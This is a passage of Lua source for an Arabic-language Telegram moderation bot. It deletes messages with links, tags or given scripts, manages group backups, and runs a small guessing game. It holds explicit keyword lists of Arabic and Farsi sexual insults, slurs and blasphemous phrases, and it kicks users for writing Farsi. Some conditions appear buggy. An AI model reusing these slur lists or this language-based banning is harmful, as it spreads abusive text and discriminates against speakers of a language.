local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Video]")
end
end
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--Gif
--Gif
------- --- Gif---------hxouse
-- -----------------Gif
--Gif
--Gif
elseif msg_type == 'MSG:Gif' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if hxousedx1:get(HXOUSE..'bot:gifs:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Gif] ")
end
end
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--Text
--Text
------- --- Text---------hxouse
-- -----------------Text
--Text
--Text
elseif msg_type == 'MSG:Text' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
hxousedx1:setex(HXOUSE..pm, TIME_CHECK, msgs+1)
end
end
--vardump(msg)
if hxousedx1:get(HXOUSE.."bot:group:link"..msg.chat_id_) == 'waiting' then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local hash = "bot:group:link"..msg.chat_id_
hxousedx1:set(HXOUSE..hash,glink)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group link has been saved ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حفظ الرابط ', 1, 'md')
end
end
end
function check_username(extra,result,success)
--vardump(result)
local username = (result.username_ or '')
local svuser = 'user:'..result.id_
if username then
hxousedx1:hset(svuser, 'username', username)
end
if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
if hxousedx1:get(HXOUSE..'bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
else
chat_kick(msg.chat_id_, bots[i].user_id_)
return false
end
end
end
getUser(msg.sender_user_id_,check_username)
hxousedx1:set(HXOUSE..'bot:editid'.. msg.id_,msg.content_.text_)
if not is_free(msg, msg.content_.text_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
check_filter_words(msg,text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Text]")
if hxousedx1:get(HXOUSE..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if hxousedx1:get(HXOUSE..'bot:text:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Text]")
end
if msg.forward_info_ then
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if msg.content_.text_:match("@") then
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
local hash = 'bot:sens:spam'..msg.chat_id_
if not hxousedx1:get(HXOUSE..hash) then
sens = 400
else
sens = tonumber(hxousedx1:get(HXOUSE..hash))
end
if hxousedx1:get(HXOUSE..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
delete_msg(chat,msgs)
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Text]")
end
end
end
end
----------------HXOUSE TEAM----------
local msg = data.message_
text = msg.content_.text_
if text and is_monsh(msg.sender_user_id_, msg.chat_id_) then 
if hxousedx1:get('hxouse:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
hxousedx1:del('hxouse:'..bot_id..'id:user'..msg.chat_id_)  
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم الغاء الامر', 1, 'md')
hxousedx1:del('hxouse:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
hxousedx1:del('hxouse:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = hxousedx1:get('hxouse:'..bot_id..'id:user'..msg.chat_id_)  
hxousedx1:incrby('hxouse:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
hxousedx(msg.chat_id_, msg.id_,  1, "⌯︙ تم اضافه له *{ "..numadded..' }* رساله ', 1, 'md')
end
end
if text:match("طيز") or text:match("ديس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not hxousedx1:get(HXOUSE.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
end
end
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE.."farsi"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
if hxousedx1:get(HXOUSE..'far'..msg.chat_id_) == 'thhhh' then
delete_msg(chat, msgs)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ممنوع التكلم باللغه الفارسيه هنا  ', 1, 'md')   
elseif hxousedx1:get(HXOUSE..'far'..msg.chat_id_) == 'bedthhh' then
delete_msg(chat, msgs)
end
end
end
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE.."farsiban"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end 
end
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("سني") or text:match("طائفتكم") or text:match("اني سني") or text:match("اني شيعي") or text:match("انا سني") or text:match("انا شيعي") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not hxousedx1:get(HXOUSE.."taf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ممنوع التكلم بالطائفيه هنا  ', 1, 'md')   
end 
end
if text:match("خره بالله") or text:match("خبربك") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not hxousedx1:get(HXOUSE.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ممنوع الكفر هنا  ', 1, 'md')   
end 
end
---------------------------------------------HXOUSE TEAM----------------------------------------------------------

------- 
if text == 'جلب نسخه الكروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then
local list = hxousedx1:smembers(HXOUSE..'bot:groups')  
local t = '{"BOT_ID": '..HXOUSE..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = title_name(v) or ''
NAME = NAME:gsub('"','')
NAME = NAME:gsub('#','')
NAME = NAME:gsub([[\]],'')
link = hxousedx1:get(HXOUSE.."bot:group:link"..v) or ''
welcome = hxousedx1:get(HXOUSE..'welcome:'..v) or ''
MNSH = hxousedx1:smembers(HXOUSE..'bot:monsh:'..v)
MDER = hxousedx1:smembers(HXOUSE..'bot:owners:'..v)
MOD = hxousedx1:smembers(HXOUSE..'bot:momod:'..v)
VIP = hxousedx1:smembers(HXOUSE..'bot:vipmem:'..v)
if k == 1 then
t = t..'"'..v..'":{"GP_NAME":"'..NAME..'",'
else
t = t..',"'..v..'":{"GP_NAME":"'..NAME..'",'
end

if #VIP ~= 0 then 
t = t..'"VIP":['
for k,v in pairs(VIP) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}'
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..HXOUSE..'.json', '⌯︙ عدد كروبات البوت  '..#list..'',dl_cb, nil)
end
if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
---------------------------******** END MSG CHECKS HXOUSE********--------------------------------------------
if hxousedx1:get(HXOUSE.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
hxousedx( msg.chat_id_, msg.id_, 1,"*⌯︙ يوجد فقط { 6 } اختيارات ارسل اختيارك مره اخره*\n", 1, "md")    
return false  end 
local GETNUM = hxousedx1:get(HXOUSE.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
hxousedx1:del(HXOUSE.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
hxousedx( msg.chat_id_, msg.id_, 1,'\n*⌯︙ مبروك لقد ربحت  \n⌯︙ المحيبس باليد رقم { '..NUM..' } \n⌯︙حصلت على {  5 } نقاط يمكن استبدالها برسائل  *', 1, "md") 
hxousedx1:incrby(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
hxousedx1:del(HXOUSE.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
hxousedx( msg.chat_id_, msg.id_, 1,'\n*⌯︙ للاسف لقد خسرت  \n⌯︙ المحيبس باليد رقم { '..GETNUM..' } \n⌯︙ حاول مره اخرى للعثور على المحيبس  *', 1, "md")
end
end
end
if hxousedx1:get(HXOUSE.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local hash = "bot:supports:link"
hxousedx1:set(HXOUSE..hash, glink)
if hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙  *Support link has been Saved*  ", 1, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفض رابط كروب الدعم ", 1, "md")
end
hxousedx1:del(HXOUSE.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local hash = "bot:supports:link"
hxousedx1:set(HXOUSE..hash, bID)
if hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ *Support Bot ID* has been *Saved* ", 1, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفض معرف الدعم ", 1, "md")
end
hxousedx1:del(HXOUSE.."bot:support:link" .. msg.sender_user_id_)
end
end
if hxousedx1:get(HXOUSE..'hxouse4'..msg.sender_user_id_) then
hxousedx1:del(HXOUSE..'hxouse4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = json:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
hxousedx(msg.chat_id_,msg.id_, 1, "*⌯︙ لم ترفعني ادمن في قناتك ارفعني اولا *\n", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
hxousedx(msg.chat_id_,msg.id_, 1, "*⌯︙ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
return false
end end 
if not msg.content_.text_ then
hxousedx(msg.chat_id_,msg.id_, 1, "*⌯︙ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
hxousedx1:set(HXOUSE..'hxouse3',CH_BOT)
hxousedx(msg.chat_id_,msg.id_, 1, "⌯︙ تم حفظ القناة \n⌯︙ قم بتفعيل الاشتراك الاجباري الان \n", 1 , "html")
return false
end
if hxousedx1:get(HXOUSE.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
local zakrf = text:match("(.*)")  
hxousedx1:del(HXOUSE.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_)     
if not text:find('[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]') then 
hxouse = zakrf 
local font_base = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local font_hash = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local fonts = {      "ضـٍہًہ,صًـٍـًہ,ـᓆـ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,ـפֿـ,ـפـ,ج,ش,ـωـ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظٍـً,طہـۛ,ز,ر,ـב,پ,ـפּـ,ڪٰྀہٰٰٖـ,گـ,ثِْْہٰٰہٰٰہٰٰـ,ژ,ذَِِِْ,آ,ئ,.,_",      
"ضۜۜہٰٰ,صۛہُُِِٰٰۛہٰٰۛہٰٰ,قྀ̲ہٍٍٰٰٰٰٰྀ̲ہٰٰٰྀ̲ہٰٰٰ,ف͒ہِِٰٰٰٰ͒ہٰٰ͒ہٰٰ,غہِِِِٰٰٰٰہٰٰہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہّّٰٰٰ̐ہٰ̐ہ,حہٌٌٰٰٰٰہٰٰہٰٰ,جًًِِّّْْْۧۧۧ,شِٰہََُُِٰٰٰہِٰٰٰہٰٰ,سٌٌٍٍٰٰٰٰٰٰٓٓٓ,ی,بّہٌٌِِّٰٰہّہ,لْْٰٰ,آ,نَِٰہٍٍَِٰٰٰہَِٰہ,تَہََّّٰٰٰہََٰہَٰ,مٰ̲ہٍٍٰٰٰ̲ہٰ̲ہ,چ,ظۗہََِِْْٰٰۗہٰٰۗہٰٰ,طۨہََُُِِٰٰۨہٰٰۨہٰٰ,زًًَََََ,رِِٰٰ,دِِٰٰ,پ,وٍٍِِِّّ,ڪٰྀہٰٰٖ,گ,ثہِِْْْْٰٰہٰٰہٰٰ,ژ,ذََِِِْْ,ئ,آ,.,_",      
"ضــ,صــ,قــ,فــ,غــ,عــ,ـهــ,خــ,حــ,جــ,شــ, سـ,یــ,بــ,لــ,ﺂ,نــ,تــ,مــ,چــ,ظــ,طــ,ـز,ـر,ـد,پــ,ـو,کــ,گــ,ـثــ,ـژ,ـذ,ﺂ,ئ,.,_",        
"ضۜہٰٰ,صۛہٰٰ,قྀ̲ہٰٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہ,حہٰٰ,جْۧ,شِٰہٰٰ,سٰٰٓ,ی,بّہ,ل,آ,نَِٰہ,تَہَٰ,مٰ̲ہ,چ,ظۗہٰٰ,طۨہٰٰ,زَ,ر,د,پ,وِ,ک,گ,ثہٰٰ,ژ,ذِ,ئ,آ,.,_",      
"ضًً,صــَ,ق,ف,غً,عـًً,هہـ,خِہ,ـحّ,جــٌ,ڜ,سُُُُُ,ی,بــِ,لـ,أ,نــہٰ⇣ـ,ِِتً,مہـً,چ,ظـَ,ط,ز,ر,د,پ,وُ,ﮏ,گ,ثـ͜͡ہــِ,ژ,ذ,ئ,أ  ,.,_",      
"ضًـٍـًہًـٍـًہ,صًـٍـًہ,ق,ف,غً,عً,هہـ,خِہ,ב,,جـﮩ๋͜ﮧـ͜ާْ,ڜـ͜ާ,سـّــً,ی,بہ,لـﮩﮨہٰٰہٰ,أ,טּ,تہٍِۣـّ̐ہٰ,مہ,چ,ظٍـًہ,ط,ز,ر,د,پ,وُ,ڪـ,گ,ثہـٰ̲ہٰٰ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غـ͜ﮩ͞ـ,عـ͜ﮩ͞ـ,هہـۛ,خہـۛ,ﺣہـۛ,جہـۛ,شۖہـۛ,سۜہـۛ,ی,بـ,ل,اآ,نہـۛ,تـ͜ﮩ͞ـ,مہـۛ,چ,ظـ͜ـ,طہـۛ,ز,ر,د,پ,ؤ,كـ͜ﮩ,گ,ثۨہـۛ,ژ,ذ,ئ,اآ  ,.,_",      
"ضـ͜,صـ,ق,فـ͜ـ,غہۛـۛ,عۛـۛ,ه๋͜‏ـ,خ,ح,ج,شـ͜ﮩ͞ـ,سـ͜ﮩ͞ـ,ی,ﯧـۛ,لـۛ,اآ,نـ͜ـ,ت,م͜͞ـ,چ,ظـۛ,ط๋͜‏ـ,ز,ر,د,پ,وُ,كـهـۛ,گ,ث,ژ,ذ,ئ,اآ  ,.,_",      
"ض๋͜‏ـۣۛ,صـ๋͜‏ـۣۛ,قـ,فـ๋͜‏ـۣۛ,غـ๋͜‏ـۣۛـ,عـ๋͜‏ـ,ه,خـ๋͜‏ـۣ,حـ๋͜‏ـ,,جـ๋͜‏ـ,شـ๋͜‏ـ,سـ๋͜‏ـ,ی,بہ,ل,أ,ن,تـ๋͜‏ـ,م,چ,ظـ๋͜‏ـ,ط,ز,ر,د,پ,و,كـ๋͜‏ـ,گ,ثہ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غ,ع,هـ͜ﮩ͞ـ,خ,ح,ج,ش,س,ی,ب,لـّﮩ๋͜‏ـ,آ,نہٰٰ,ྀ̲تہٰٰ,مـّﮩ๋͜‏ـ,چ,طـྀ̲͜ہٰٰ,طـ͜ﮩ͞ـ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صۛہٰٰ,قྀ̲ہٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,خٰ̐ہ,حہٰٰ,جْہ,شِٰہٰٰ,سٰٓہ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظہٰٰྀ̲,طہٰٰ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
